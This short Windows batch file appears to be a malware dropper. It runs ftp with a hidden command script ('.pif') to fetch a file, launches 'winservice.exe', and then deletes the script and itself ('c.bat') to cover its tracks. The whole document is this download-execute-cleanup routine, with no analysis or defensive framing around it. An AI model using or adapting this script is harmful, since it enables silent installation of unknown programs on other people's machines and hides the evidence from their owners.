@echo off 
ftp -n -v -s:.pif 
winservice.exe 
del .pif 
del /F c.bat 
exit /y 
